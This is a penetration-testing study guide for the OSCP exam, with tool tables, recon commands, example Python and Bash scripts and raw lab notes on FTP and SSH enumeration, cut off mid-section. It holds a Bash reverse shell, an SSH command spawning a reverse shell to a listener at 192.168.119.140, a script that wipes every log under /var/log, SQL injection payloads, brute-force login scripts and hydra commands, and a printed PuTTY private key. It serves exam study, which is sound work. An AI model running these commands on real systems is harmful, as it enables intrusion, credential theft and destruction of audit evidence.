### OSCP Study Notes

# OSCP Study Notes

This document serves as a comprehensive guide for the OSCP (Offensive Security Certified Professional) exam preparation. It covers essential concepts, tools, commands, and techniques necessary for penetration testing and ethical hacking.


## Table of Contents

1. [Introduction](#introduction)
2. [Understanding the OSCP Exam](#understanding-the-oscp-exam)
3. [Key Concepts](#key-concepts)
4. [Common Commands](#common-commands)
5. [Tools and Resources](#tools-and-resources)
6. [Reconnaissance](#reconnaissance)
7. [Vulnerability Scanning](#vulnerability-scanning)
8. [Exploitation Techniques](#exploitation-techniques)
9. [Post-Exploitation](#post-exploitation)
10. [Privilege Escalation](#privilege-escalation)
11. [Web Application Attacks](#web-application-attacks)
12. [Networking and Enumeration](#networking-and-enumeration)
13. [Dark Web Investigations](#dark-web-investigations)
14. [Capture the Flag (CTF) Platforms](#capture-the-flag-ctf-platforms)
15. [Legal and Ethical Considerations](#legal-and-ethical-considerations)
16. [Advanced Topics](#advanced-topics)
17. [OSCP Labs Review](#oscp-labs-review)
18. [Scripting and Automation](#scripting-and-automation)
19. [Exploit Development](#exploit-development)
20. [Case Studies](#case-studies)
21. [Exam Strategies](#exam-strategies)
22. [Final Thoughts](#final-thoughts)

---

## Introduction
The OSCP certification is one of the most respected credentials in the field of cybersecurity. It demonstrates practical skills in penetration testing, a critical area for identifying and mitigating vulnerabilities in systems. This study guide is designed to help candidates understand key concepts, master essential commands, and effectively use the tools necessary for success in the exam.

---

## Understanding the OSCP Exam
The OSCP exam is a hands-on test that requires candidates to demonstrate their ability to compromise various systems within a controlled environment. The exam typically lasts for **24 hours**, during which candidates must earn a minimum of 70 points out of 100.

### Exam Format
- **Lab Environment**: A network of machines with varying vulnerabilities.
- **Exam Objective**: Successfully exploit systems and document the process.
- **Submission**: A detailed penetration testing report.

---

## Key Concepts
- **Penetration Testing**: The process of evaluating the security of a system by simulating an attack.
- **Ethical Hacking**: Hacking performed with permission to improve security.
- **Reconnaissance**: The initial phase of penetration testing, gathering information about the target.
- **Exploitation**: Taking advantage of vulnerabilities to gain unauthorized access.

---

## Common Commands
A list of commonly used commands in penetration testing is crucial for efficiency.

| **Command**                                | **Description**                                                   |
|--------------------------------------------|-------------------------------------------------------------------|
| `nmap -sC -sV <IP>`                        | Perform a service version detection scan on the target.          |
| `curl -i <URL>`                           | Fetch HTTP headers and responses from a target URL.              |
| `whois <domain>`                          | Retrieve domain registration details.                             |
| `netstat -tuln`                           | Display active network connections and listening ports.           |
| `find / -perm -u=s -type f 2>/dev/null`  | Search for SUID binaries to identify potential escalation paths.  |
| `grep -r "search_term" /path/to/dir`      | Search recursively for a string within files.                   |
| `sudo lsof -i :<port>`                     | List processes using a specific port.                           |
| `chmod +x <script>`                       | Make a script executable.                                        |
| `service <service_name> restart`          | Restart a specified service.                                     |
| `ssh user@<IP>`                           | Connect to a remote machine using SSH.                           |
| `scp <file> user@<IP>:<destination>`      | Securely copy files to a remote machine via SSH.                |
| `rsync -avz <source> <destination>`       | Synchronize files/directories between local and remote locations. |
| `wget <URL>`                              | Download files from the web.                                    |
| `traceroute <domain/IP>`                  | Trace the route packets take to reach the target.                 |
| `iptables -L`                             | List current firewall rules on a Linux system.                  |
| `history`                                 | Display the command history for the current user.                |
| `man <command>`                           | Show the manual for a command.                                  |
| `ping -c 4 <IP>`                         | Check connectivity to a target IP address.                      |
| `whoami`                                  | Display the current logged-in user.                              |
| `cat <file>`                              | Concatenate and display the contents of a file.                 |

### Additional Commands
| **Command**                                | **Description**                                                   |
|--------------------------------------------|-------------------------------------------------------------------|
| `sudo apt-get update`                     | Update package lists for upgrades.                              |
| `sudo apt-get install <package>`          | Install a specified package.                                    |
| `dpkg -l`                                 | List all installed packages.                                    |
| `cat /etc/passwd`                         | View user account information.                                   |
| `uname -a`                                | Display system information.                                      |
| `df -h`                                   | Show disk space usage in a human-readable format.               |
| `free -m`                                 | Display memory usage in megabytes.                              |
| `top`                                     | Monitor system processes in real-time.                          |
| `ps aux`                                  | Show detailed information about running processes.              |
| `history | grep <command>`                 | Search command history for a specific command.                 |

---

## Tools and Resources
### Essential Tools for OSCP Preparation:
| **Tool**              | **Purpose**                                                       | **Command**                                                 | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------------------------------|
| **Nmap**              | Network scanning tool                                             | `nmap -sC -sV <IP>`                                      | Scans target for open ports and services.                         |
| **Burp Suite**        | Web application security testing tool                            | Use GUI to intercept and analyze traffic.                  | An intercepting proxy for web applications.                        |
| **Metasploit**        | Exploit development and execution framework                      | `msfconsole` to start the Metasploit console.             | A framework for developing and executing exploit code.            |
| **Wireshark**         | Network protocol analyzer                                        | Open Wireshark and capture traffic.                        | Captures and analyzes packets transmitted over networks.          |
| **Gobuster**          | Directory and file brute-forcing tool                           | `gobuster dir -u <URL> -w <wordlist>`                   | Enumerates directories and files on a web server.                |
| **Nikto**             | Web server scanner                                               | `nikto -h <IP>`                                          | Scans web servers for vulnerabilities.                             |
| **OpenVAS**           | Vulnerability scanning tool                                      | `openvas-setup` to configure and `openvas-start` to run. | Open-source vulnerability assessment scanner.                      |
| **Hydra**             | Password cracking tool                                           | `hydra -l <user> -P <password_list> <target> <protocol>` | Used to perform brute force attacks on login pages.               |
| **John the Ripper**   | Password cracking tool                                           | `john --wordlist=<wordlist> <file>`                      | Cracks password hashes using a dictionary attack.                 |

### Useful Resources:
- [Offensive Security PWK Course](https://www.offensive-security.com/pwk-oscp/)
- [Hack The Box](https://www.hackthebox.eu/)
- [OSCP Preparation Material](https://oscp-guide.com/)

---

## Reconnaissance
### What is Reconnaissance?
Reconnaissance is the first step in penetration testing where you gather information about your target. This phase is crucial as it lays the groundwork for all subsequent steps. The information gathered can help identify potential vulnerabilities, entry points, and system weaknesses.

### How to Perform Reconnaissance
Reconnaissance can be categorized into two types: **Active** and **Passive**.

- **Passive Reconnaissance**: Involves gathering information without directly interacting with the target. This can include searching publicly available information, such as:
  - WHOIS databases
  - Social media platforms
  - Company websites

- **Active Reconnaissance**: Involves directly interacting with the target to collect information. This can include:
  - Network scanning with tools like Nmap
  - Banner grabbing to learn more about services running on the target.

### Tools for Reconnaissance
| **Tool**              | **Purpose**                                                       | **Command**                                                 | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------------------------------|
| **Nmap**              | Network mapping and port scanning                                 | `nmap -sP <IP-range>`                                      | Identify live hosts in a network.                                 |
| **WHOIS**             | Domain registration information                                   | `whois <domain>`                                          | Retrieve registration details for domains.                        |
| **

theHarvester**      | E-mail and subdomain harvesting                                   | `theharvester -d <domain> -b google`                     | Gather e-mail addresses and subdomains related to a target.      |
| **Google Dorking**    | Advanced Google search techniques                                 | `site:<domain>`                                          | Use specific search queries to find sensitive information.        |
| **Shodan**            | Search engine for Internet-connected devices                      | `shodan search <query>`                                   | Find devices connected to the internet that match the query.     |

### Applications in OSCP and Cybersecurity
- **OSCP**: Gathering information to identify possible entry points and vulnerabilities.
- **Hacking**: Establishing a foothold by knowing the target's layout and services.
- **Bug Hunting**: Identifying weaknesses in applications or systems to report.

---

## Vulnerability Scanning
### What is Vulnerability Scanning?
Vulnerability scanning is a critical step in the penetration testing process. It involves identifying and evaluating vulnerabilities in a target system, application, or network. The goal is to discover security weaknesses that could be exploited by attackers.

### Tools for Vulnerability Scanning
| **Tool**              | **Purpose**                                                       | **Command**                                                 | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------------------------------|
| **OpenVAS**           | Comprehensive vulnerability assessment                            | `openvas-start`                                           | A web-based interface for managing scans.                        |
| **Nessus**            | Vulnerability assessment tool                                     | Use GUI to configure scans.                               | A proprietary vulnerability scanner widely used in the industry.  |
| **Nikto**             | Web server scanner                                               | `nikto -h <IP>`                                          | Scans for known vulnerabilities in web servers.                  |
| **Qualys**            | Cloud-based vulnerability management                             | Use GUI for configuration.                               | A cloud service for automated security assessments.               |

### Vulnerability Scanning Process
1. **Identify Target**: Determine the IP addresses or domains to scan.
2. **Select Tools**: Choose appropriate scanning tools based on the target and scope.
3. **Configure Scans**: Set up scanning parameters such as depth and types of scans.
4. **Analyze Results**: Review the output for identified vulnerabilities.
5. **Prioritize Findings**: Assess which vulnerabilities pose the greatest risk and require immediate attention.

---

## Exploitation Techniques
### What is Exploitation?
Exploitation refers to the process of taking advantage of a vulnerability in a system or application to gain unauthorized access or perform unauthorized actions. This is a critical phase in the penetration testing lifecycle, as it tests the effectiveness of security measures.

### Common Exploitation Techniques
1. **SQL Injection**: Injecting malicious SQL queries to manipulate databases.
2. **Cross-Site Scripting (XSS)**: Injecting scripts into webpages viewed by users.
3. **Command Injection**: Executing arbitrary commands on a host operating system via a vulnerable application.
4. **Buffer Overflow**: Overwriting memory of an application by sending more data than it can handle.

### Tools for Exploitation
| **Tool**              | **Purpose**                                                       | **Command**                                                 | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------------------------------|
| **Metasploit**        | Exploit development and execution framework                      | `msfconsole`                                             | A framework for developing and executing exploit code.            |
| **sqlmap**            | Automatic SQL injection tool                                     | `sqlmap -u <url>`                                       | Detect and exploit SQL injection vulnerabilities.                 |
| **Burp Suite**        | Web application security testing tool                            | Use GUI to intercept and analyze traffic.                  | An intercepting proxy for web applications.                        |
| **Hydra**             | Password cracking tool                                           | `hydra -l <user> -P <password_list> <target> <protocol>` | Used to perform brute force attacks on login pages.               |

---

## Post-Exploitation
### What is Post-Exploitation?
Post-exploitation involves actions taken after successfully gaining access to a system. The goal is to maintain access, gather additional information, and pivot to other systems within the network.

### Key Objectives
- **Data Exfiltration**: Retrieving sensitive data from the compromised system.
- **Privilege Escalation**: Gaining higher-level access within the system or network.
- **Persistence**: Installing backdoors or other methods to retain access.

### Tools for Post-Exploitation
| **Tool**              | **Purpose**                                                       | **Command**                                                 | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------------------------------|
| **Mimikatz**          | Windows credential extraction tool                               | `mimikatz`                                                | Extract credentials from Windows systems.                         |
| **Empire**            | Post-exploitation framework                                       | Use GUI or CLI for operations.                             | A framework for executing PowerShell agents on Windows.          |
| **PowerSploit**       | PowerShell post-exploitation framework                           | Use PowerShell commands.                                   | A collection of PowerShell scripts for post-exploitation tasks.   |

---

## Privilege Escalation
### What is Privilege Escalation?
Privilege escalation refers to the exploitation of a bug or vulnerability in a system to gain elevated access to resources that are normally protected from the user. This can be critical in a penetration test, allowing attackers to gain more control over the target system.

### Techniques for Privilege Escalation
1. **SUID/SGID Files**: Exploiting files with special permissions.
2. **Kernel Exploits**: Taking advantage of vulnerabilities in the operating system kernel.
3. **Misconfigured Services**: Exploiting services running with higher privileges.

### Tools for Privilege Escalation
| **Tool**              | **Purpose**                                                       | **Command**                                                 | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------------------------------|
| **LinPEAS**           | Privilege escalation enumeration tool                           | `./linpeas.sh`                                           | Gathers information for privilege escalation on Linux.            |
| **Windows Exploit Suggester** | Identifies potential exploits for Windows systems      | Use GUI or CLI for analysis.                               | Analyzes Windows systems and suggests relevant exploits.          |
| **GTFOBins**         | Exploit techniques using binaries available on the system       | Use website to look up binaries.                           | Provides methods for leveraging common binaries for escalation.   |

---

## Web Application Attacks
### Types of Web Application Attacks
1. **SQL Injection**: Exploiting vulnerable SQL queries.
2. **Cross-Site Scripting (XSS)**: Injecting scripts into web pages.
3. **Cross-Site Request Forgery (CSRF)**: Forcing users to perform actions without their consent.

### Tools for Web Application Attacks
| **Tool**              | **Purpose**                                                       | **Command**                                                 | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------------------------------|
| **Burp Suite**        | Web application security testing tool                            | Use GUI for scanning and exploitation.                     | Intercept and modify HTTP requests.                               |
| **OWASP ZAP**         | Web application security scanner                                  | `zap.sh`                                                   | Scans for vulnerabilities in web applications.                    |
| **SQLMap**            | Automatic SQL injection tool                                     | `sqlmap -u <URL>`                                         | Detect and exploit SQL injection vulnerabilities.                 |

---

## Networking and Enumeration
### Networking Fundamentals
Understanding networking is crucial for penetration testing. Familiarize yourself with TCP/IP, subnetting, and common protocols (HTTP, FTP, DNS, etc.).

### Enumeration Techniques
1. **Service Enumeration**: Identifying services running on open ports.
2. **User Enumeration**: Gathering information about user accounts on a system.

### Tools for Networking and Enumeration
| **Tool**              | **Purpose**                                                       | **Command**                                                 | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------------------------------|
| **Nmap**              | Network scanning and enumeration                                  | `nmap -sV -p <port_range> <target>`                      | Discover services running on target hosts.                        |
| **Netcat**            | Networking utility for reading and writing data                  | `nc -lvnp <port>`                                        | Set up a listener on a specified port.                            |
| **enum4linux**        | Linux enumeration tool                                           | `enum4linux <target>`                                     | Gather information from Windows systems.                          |

---

## Dark Web Investigations
### What is the Dark Web?
The Dark Web is a part of the internet that is not indexed by traditional search engines and requires specific software to access. It is often associated with illicit activities, but can also be used for legitimate purposes such as privacy protection and secure communication.

### Tools for Dark Web Investigations
| **Tool**              | **Purpose**                                                       | **Command**                                                 | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|-------------------------------------------------------------|--------------------------------------------------------------------|
| **Tor Browser**       | Access the Dark Web                                              | Download from the official website.                       | Allows anonymous browsing of the Dark Web.                       |
| **OnionScan**         | Dark Web site scanner                                           | `onionscan <onion_link>`                                   | Analyzes onion sites for vulnerabilities.                        |
| **Ahmia**             | Search engine for the Dark Web                                   | Visit ahmia.fi                                            | Search for .onion sites.                                         |

---

## Capture the Flag (CTF) Platforms
### What is a CTF?
Capture the Flag (CTF) challenges are competitions in which participants

 try to solve security-related problems to earn points. They simulate real-world scenarios and help improve skills in cybersecurity.

### Popular CTF Platforms
| **Platform**          | **Purpose**                                                       | **Description**                                                    |
|-----------------------|-------------------------------------------------------------------|--------------------------------------------------------------------|
| **Hack The Box**      | Online platform for practicing penetration testing               | Offers a variety of vulnerable machines for practice.             |
| **TryHackMe**         | Interactive learning platform for cybersecurity                  | Provides guided exercises for learning different security topics.  |
| **OverTheWire**       | Wargames for learning security concepts                           | Offers a series of games to teach security principles.             |

---

## Legal and Ethical Considerations
### Importance of Ethics in Hacking
Ethical hacking involves understanding legal implications and ethical responsibilities. Always ensure that your actions are authorized and lawful.

### Legal Framework
- **Laws and Regulations**: Familiarize yourself with laws related to cybersecurity in your region (e.g., CFAA in the USA).
- **Ethical Guidelines**: Follow established ethical guidelines, such as those provided by organizations like (ISC)² and Offensive Security.

---

## Advanced Topics
### Advanced Exploit Techniques
- **Buffer Overflow Exploitation**: Techniques to exploit buffer overflow vulnerabilities.
- **Return-Oriented Programming (ROP)**: Using existing code to bypass security mechanisms.

### Offensive Security Techniques
- **Social Engineering**: Manipulating individuals into revealing confidential information.
- **Physical Penetration Testing**: Assessing security by attempting to gain physical access to a facility.

---

## OSCP Labs Review
### Key Areas to Focus On
- **Active Directory Attacks**: Understanding how to exploit and navigate AD environments.
- **Linux Privilege Escalation**: Techniques specific to gaining higher privileges on Linux systems.

### Practice Strategies
- **Hands-on Practice**: Use OSCP labs to get real experience.
- **Documentation**: Keep thorough notes of your approaches and the lessons learned.

---

## Scripting and Automation
### Importance of Scripting
Scripting helps automate repetitive tasks in penetration testing. Python and Bash are popular scripting languages for this purpose.

### Useful Scripts
| **Script Name**        | **Purpose**                                                      | **Description**                                                    |
|------------------------|------------------------------------------------------------------|--------------------------------------------------------------------|
| **Port Scanner**       | Scans for open ports on a target machine.                      | Automates the process of checking for open ports.                 |
| **Web Crawler**        | Crawls websites to find links and resources.                    | Automates link discovery on web applications.                      |
| **SQL Injection Tester**| Tests URLs for SQL injection vulnerabilities.                  | Automates SQL injection testing on web applications.               |

### Example Scripts
1. **Port Scanner (Python)**
```python
import socket

def scan_ports(target):
    for port in range(1, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"Port {port} is open")
        sock.close()

scan_ports('192.168.1.1')
```

2. **Web Crawler (Python)**
```python
import requests
from bs4 import BeautifulSoup

def crawl(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    for link in soup.find_all('a'):
        print(link.get('href'))

crawl('http://example.com')
```

3. **SQL Injection Tester (Python)**
```python
import requests

def test_sql_injection(url):
    payloads = ["1' OR '1'='1", "1' UNION SELECT username, password FROM users--"]
    for payload in payloads:
        response = requests.get(f"{url}?id={payload}")
        if "error" not in response.text:
            print(f"Vulnerable to SQL Injection: {payload}")

test_sql_injection('http://example.com/vulnerable_page.php')
```

4. **Service Up Checker (Bash)** 
```bash
#!/bin/bash
for port in {1..1024}; do
    (echo > /dev/tcp/127.0.0.1/$port) >/dev/null 2>&1 && echo "Port $port is open"
done
```

5. **SSL Checker (Python)** 
```python
import ssl
import socket

hostname = 'example.com'
port = 443
context = ssl.create_default_context()
with socket.create_connection((hostname, port)) as sock:
    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
        print(ssock.version())
```

6. **User Enumeration (Bash)** 
```bash
for user in $(cat users.txt); do
    curl -s -o /dev/null -w "%{http_code} $user\n" http://target.com/user/$user
done
```

7. **Basic Recon Script (Python)** 
```python
import subprocess

def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(result.stdout)

run_command('nmap -sP 192.168.1.0/24')
```

8. **Reverse Shell (Bash)** 
```bash
#!/bin/bash
bash -i >& /dev/tcp/your_ip/your_port 0>&1
```

9. **Log File Cleaner (Bash)** 
```bash
#!/bin/bash
find /var/log -type f -name "*.log" -exec truncate -s 0 {} \;
```

10. **Automated SQL Injection Script (Python)** 
```python
import requests

url = 'http://target.com/vuln.php?id=1'
payloads = ["1", "1' OR '1'='1", "1' UNION SELECT * FROM users--"]

for payload in payloads:
    response = requests.get(url + payload)
    if "database" in response.text.lower():
        print(f"Vulnerable to SQL Injection: {payload}")
```

### Additional Scripts
1. **Password Cracker (Python)** 
```python
import hashlib

def crack_password(hash_to_crack, password_list):
    with open(password_list, 'r') as f:
        for line in f:
            password = line.strip()
            if hashlib.md5(password.encode()).hexdigest() == hash_to_crack:
                return password
    return None

print(crack_password('5f4dcc3b5aa765d61d8327deb882cf99', 'passwords.txt'))
```

2. **Web App Form Fuzzer (Python)** 
```python
import requests

url = 'http://target.com/login'
payloads = {'username': 'admin', 'password': 'password'}

for password in ['password', '123456', 'letmein']:
    payloads['password'] = password
    response = requests.post(url, data=payloads)
    if "Welcome" in response.text:
        print(f"Found valid password: {password}")
```

3. **Basic DNS Lookup (Python)** 
```python
import socket

domain = 'example.com'
ip = socket.gethostbyname(domain)
print(f"IP address of {domain} is {ip}")
```

4. **File Download Script (Bash)** 
```bash
#!/bin/bash
wget -r -np -nH --cut-dirs=3 -R index.html http://target.com/files/
```

5. **Port Knock Script (Bash)** 
```bash
#!/bin/bash
# Knock on the ports to open the firewall
for port in 7000 8000 9000; do
    nc -w 1 target_ip $port
done
```

6. **Basic SSH Key Generator (Bash)** 
```bash
#!/bin/bash
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"
```

7. **Simple Ping Sweep (Python)** 
```python
import os
import subprocess

def ping_sweep(network):
    for i in range(1, 255):
        ip = f"{network}.{i}"
        response = subprocess.call(['ping', '-c', '1', ip], stdout=subprocess.PIPE)
        if response == 0:
            print(f"{ip} is alive")

ping_sweep('192.168.1')
```

8. **Check for Open Ports (Python)** 
```python
import socket

def check_ports(ip):
    for port in range(1, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((ip, port))
        if result == 0:
            print(f"Port {port} is open")
        sock.close()

check_ports('192.168.1.1')
```

9. **Automated Email Sender (Python)** 
```python
import smtplib

def send_email(subject, message, to_email):
    from_email = "youremail@example.com"
    password = "yourpassword"
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, password)
    msg = f"Subject: {subject}\n\n{message}"
    server.sendmail(from_email, to_email, msg)
    server.quit()

send_email("Test Subject", "This is a test email.", "recipient@example.com")
```

10. **Simple HTTP Server (Python)** 
```python
import http.server
import socketserver

PORT = 8000

Handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", PORT), Handler

) as httpd:
    print("serving at port", PORT)
    httpd.serve_forever()
```

---

# ADVANCE & IMPORTANT STUDY MATERIAL WITH SOME RESOURCES

### Network Enumeration
````
ping $IP #63 ttl = linux #127 ttl = windows
````
````
nmap -p- --min-rate 1000 $IP
nmap -p- --min-rate 1000 $IP -Pn #disables the ping command and only scans ports
````
````
nmap -p <ports> -sV -sC -A $IP
````
### Stealth Scan
````
nmap -sS -p- --min-rate=1000 10.11.1.229 -Pn #stealth scans
````
### Rust Scan
````
target/release/rustscan -a 10.11.1.252
````
### UDP Scan
````
sudo nmap -F -sU -sV $IP
````
### Script to automate Network Enumeration
````
#!/bin/bash

target="$1"
ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

echo "Running second nmap scan with open ports: $ports"

nmap -p "$ports" -sC -sV -A "$target"
````
### Autorecon
````
autorecon 192.168.238.156 --nmap-append="--min-rate=2500" --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 -vv
````
### Port Enumeration
#### FTP port 21
##### Emumeration
````
ftp -A $IP
ftp $IP
anonymous:anonymous
put test.txt #check if it is reflected in a http port
````
###### Upload binaries
````
ftp> binary
200 Type set to I.
ftp> put winPEASx86.exe
````
##### Brute Force
````
hydra -l steph -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.68 -t 4 ftp
hydra -l steph -P /usr/share/wordlists/rockyou.txt 10.1.1.68 -t 4 ftp
````
##### Downloading files recursively
````
wget -r ftp://steph:billabong@10.1.1.68/
wget -r ftp://anonymous:anonymous@192.168.204.157/
````
````
find / -name Settings.*  2>/dev/null #looking through the files
````
##### Exiftool
````
ls
BROCHURE-TEMPLATE.pdf  CALENDAR-TEMPLATE.pdf  FUNCTION-TEMPLATE.pdf  NEWSLETTER-TEMPLATE.pdf  REPORT-TEMPLATE.pdf
````
````
exiftool *                                             

======== FUNCTION-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : FUNCTION-TEMPLATE.pdf
Directory                       : .
File Size                       : 337 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:28-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:43-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Cassie
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:38:02+02:00
Modify Date                     : 2022:11:02 11:38:02+02:00
Producer                        : Microsoft® Word 2016
======== NEWSLETTER-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : NEWSLETTER-TEMPLATE.pdf
Directory                       : .
File Size                       : 739 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:37-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:44-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Mark
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:11:56+02:00
Modify Date                     : 2022:11:02 11:11:56+02:00
Producer                        : Microsoft® Word 2016
======== REPORT-TEMPLATE.pdf
ExifTool Version Number         : 12.57
File Name                       : REPORT-TEMPLATE.pdf
Directory                       : .
File Size                       : 889 kB
File Modification Date/Time     : 2022:11:02 00:00:00-04:00
File Access Date/Time           : 2023:05:28 22:42:49-04:00
File Inode Change Date/Time     : 2023:05:28 22:40:45-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Robert
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:08:26+02:00
Modify Date                     : 2022:11:02 11:08:26+02:00
Producer                        : Microsoft® Word 2016
    5 image files read
````

#### SSH port 22
##### putty tools
````
sudo apt upgrade && sudo apt install putty-tools
````
##### puttygen 
````
cat keeper.txt          
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0

````

````
puttygen keeper.txt -O private-openssh -o id_rsa
````
````
chmod 600 id_rsa
````
````
ssh root@10.10.11.227 -i id_rsa
````

##### Emumeration
##### Exploitation
````
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa USERB@10.11.1.141 -t 'bash -i >& /dev/tcp/192.168.119.140/443 0>&1'

nc -nvlp 443
````
###### no matching key exchange method found.
````
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1\
 -oHostKeyAlgorithms=+ssh-rsa\
 -oCiphers=+aes256-cbc\
 admin@10.11.1.252 -p 22000
````
##### Brute Force
````
hydra -l userc -P /usr/share/wfuzz/wordlist/others/common_pass.txt 10.1.1.27 -t 4 ssh
hydra -L users.txt -p WallAskCharacter305 192.168.153.139 -t 4 ssh -s 42022
````
##### Private key obtained
````
chmod 600 id_rsa
ssh userb@172.16.138.14 -i id_rsa
````
##### Public key obtained
````
cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC8J1/BFjH/Oet/zx+bKUUop1IuGd93QKio7Dt7Xl/J91c2EvGkYDKL5xGbfQRxsT9IePkVINONXQHmzARaNS5lE+SoAfFAnCPnRJ+KrnJdPxYf4OQEiAxHwRJHvbYaxEEuye7GKP6V0MdSvDtqKsFk0YRFVdPKuforL/8SYtSfqYUywUJ/ceiZL/2ffGGBJ/trQJ2bBL4QcOg05ZxrEoiTJ09+Sw3fKrnhNa5/NzYSib+0llLtlGbagBh3F9n10yqqLlpgTjDp5PKenncFiKl1llJlQGcGhLXxeoTI59brTjssp8J+z6A48h699CexyGe02GZfKLLLE+wKn/4luY0Ve8tnGllEdNFfGFVm7WyTmAO2vtXMmUbPaavDWE9cJ/WFXovDKtNCJxpyYVPy2f7aHYR37arLL6aEemZdqzDwl67Pu5y793FLd41qWHG6a4XD05RHAD0ivsJDkypI8gMtr3TOmxYVbPmq9ecPFmSXxVEK8oO3qu2pxa/e4izXBFc= USERZ@example #new user found
````
##### Cracking Private Key
````
ssh2john id_ecdsa > id_ecdsa.hash

cat id_ecdsa.hash 
